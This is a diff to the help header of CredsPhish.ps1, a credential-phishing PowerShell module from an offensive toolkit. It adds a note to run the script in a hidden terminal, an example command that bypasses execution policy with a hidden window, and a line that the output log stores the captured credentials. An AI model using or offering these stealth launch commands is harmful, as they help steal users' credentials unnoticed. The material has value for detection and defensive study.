@@ -14,8 +14,14 @@ Author: enigma0x3 &('r00t-3xp10it')
    create '$env:tmp\CredsPhish.vbs' to be abble to silent execute this PS script. This module was
    inspired in the work of @enigma0x3 phishing-for-credentials POC (http://enigma0x3.net)
 
+.NOTES
+   Its recomended to exec CredsPhish.ps1 in a hidden terminal windows.
+
 .EXAMPLE
-   powershell.exe -exec bypass -w 1 -noninteractive -nologo -file "CredsPhish.ps1"
+   PS C:\> powershell -exec bypass -w 1 -noninteractive -nologo -file "CredsPhish.ps1"
+
+.INPUTS
+   None. You cannot pipe objects to CredsPhish.ps1
 
 .OUTPUTS
    Saves CredsPhish.log to the selected directory. 'tmp' is the default.
